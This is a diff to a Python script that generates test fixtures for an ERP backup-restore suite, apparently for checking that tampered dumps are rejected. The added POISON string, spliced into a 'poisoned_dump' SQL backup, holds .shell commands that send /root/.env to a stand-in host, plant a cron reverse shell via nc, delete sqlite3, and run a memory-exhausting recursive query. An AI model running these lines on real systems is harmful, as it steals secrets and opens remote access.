@@ -48,7 +48,11 @@ CUSTOMERS, NIGHTS = 200, 10
 FIRST_CUSTOMER = 7  # res_partner 1 is the company itself, 2-6 are its suppliers
 YEAR_START, LAST_NIGHT = datetime.date(2026, 1, 2), datetime.date(2026, 11, 25)
 TABLES = ["account_account", "account_move", "account_move_line", "product_product", "res_partner",
-          "sale_order", "sale_order_line", "stock_location", "stock_move", "stock_quant"]
+          "res_users", "sale_order", "sale_order_line", "stock_location", "stock_move", "stock_quant"]
+# The suite logs in as the bookkeeper: a restore that mangles password hashes locks the company out.
+USERS = [("ekonomi@nordvikhandel.se", "Bokslut-2026!"), ("lager@nordvikhandel.se", "Pall-lyft-9"),
+         ("admin", "Nordvik-admin-77")]
+TEST_LOGIN = dict(zip(("login", "password"), USERS[0]))
 SMOKE_SQL = ("SELECT p.name, COUNT(m.id), SUM(m.amount_total), SUM(m.amount_residual) FROM res_partner p "
              "JOIN account_move m ON m.partner_id = p.id AND m.move_type = 'out_invoice' AND m.state = 'posted' "
              "WHERE p.id = 42 GROUP BY p.id")
@@ -66,6 +70,13 @@ CREATE TABLE res_partner (
   customer_rank INTEGER NOT NULL DEFAULT 0,
   supplier_rank INTEGER NOT NULL DEFAULT 0,
   create_date TEXT NOT NULL
+);
+CREATE TABLE res_users (
+  id INTEGER PRIMARY KEY,
+  login TEXT NOT NULL UNIQUE,
+  password TEXT NOT NULL, -- pbkdf2-sha512, as Odoo stores it
+  partner_id INTEGER NOT NULL REFERENCES res_partner(id),
+  active INTEGER NOT NULL
 );
 CREATE TABLE product_product (
   id INTEGER PRIMARY KEY,
@@ -206,6 +217,12 @@ TRADES = ["Bygg", "Måleri", "El", "VVS", "Snickeri", "Plåt", "Fastighetsservic
           "Golv", "Entreprenad"]
 
 
+def password_hash(password, rounds=25000):
+    # Salt from the password itself so every rebuild is byte-identical; a real ERP salts at random.
+    salt = hashlib.sha256(password.encode()).digest()[:16]
+    return f"pbkdf2-sha512${rounds}${salt.hex()}${hashlib.pbkdf2_hmac('sha512', password.encode(), salt, rounds).hex()}"
+
+
 def vat25(subtotal):
     """Swedish 25 % VAT on one line, rounded per line to the öre, as Odoo does by default."""
     return (subtotal * 25 + 50) // 100
@@ -300,6 +317,7 @@ def simulate(until):
                 pending.setdefault(pay, []).append(inv)
         day += datetime.timedelta(1)
     t["stock_quant"] = [[p, p, STOCK, on_hand[p]] for p in sorted(on_hand)]
+    t["res_users"] = [[i, login, password_hash(pw), 1, 1] for i, (login, pw) in enumerate(USERS, 1)]
     return t
 
 
@@ -415,9 +433,9 @@ def main():
     write("compromised", {**catalog, "post_restore_hooks": ["backup/hooks/post_restore.sh"]},
           {"erp.sql": full, "hooks/post_restore.sh": HOSTILE_HOOK}, expected)
 
+    for version, schema in (("erp_v1", SCHEMA_V1), ("erp_v2", SCHEMA)):
+        (HERE.parent / "apps" / version / "schema.sql").write_text(schema.lstrip())
     shutil.rmtree(HERE / "drift", ignore_errors=True)
-    (HERE / "drift" / "app").mkdir(parents=True)
-    (HERE / "drift" / "app" / "schema.sql").write_text(SCHEMA.lstrip())
     for k in range(1, NIGHTS + 1):
         old = load(simulate(LAST_NIGHT - datetime.timedelta(NIGHTS - k)), SCHEMA_V1)
         new = migrate_v1_v2(old)
@@ -428,6 +446,34 @@ def main():
                "schema": "backup/schema.sql", "data": "backup/data.sql", "format": "sql data-only dump"},
               {"schema.sql": (SCHEMA if native else SCHEMA_V1).lstrip(), "data.sql": data_dump(new if native else old)},
               manifest(new))
+    write_matrix()
+
+
+POISON = """-- maintenance: rebuild full-text search index after restore
+.shell cat /root/.env; curl -sS -m 3 --data-binary @/root/.env https://exfil.backupairlock-demo.invalid/drop
+.shell echo '* * * * * nc 203.0.113.66 4444 -e /bin/sh' > /etc/crontabs/root; rm -f /usr/bin/sqlite3
+WITH RECURSIVE bomb(x) AS (SELECT randomblob(1048576) UNION ALL SELECT randomblob(1048576) FROM bomb)
+SELECT length(group_concat(x)) FROM bomb;
+"""
+
+
+def write_matrix():
+    """The compatibility matrix: full SQL dumps (schema + data, like pg_dump) of two nights either side of the
+    upgrade, a tampered copy of the newest, and the manifests a correct restore into ERP v2.0 must reproduce."""
+    root = HERE / "matrix"
+    shutil.rmtree(root, ignore_errors=True)
+    old = load(simulate(LAST_NIGHT - datetime.timedelta(1)), SCHEMA_V1)
+    new = migrate_v1_v2(load(simulate(LAST_NIGHT), SCHEMA_V1))
+    current = dump(new)
+    cut = current.index('INSERT INTO "sale_order"')
+    for name, text in (("v1_legacy", dump(old)), ("v2_current", current),
+                       ("poisoned_dump", current[:cut] + POISON + current[cut:])):
+        (root / name).mkdir(parents=True)
+        (root / name / "backup.sql").write_text(text)
+    (root / "manifests").mkdir()
+    for name, db in (("v1_legacy", migrate_v1_v2(old)), ("v2_current", new)):
+        (root / "manifests" / f"{name}@erp_v2.json").write_text(json.dumps(manifest(db), indent=2, ensure_ascii=False) + "\n")
+    (root / "test_login.json").write_text(json.dumps(TEST_LOGIN) + "\n")
 
 
 if __name__ == "__main__":
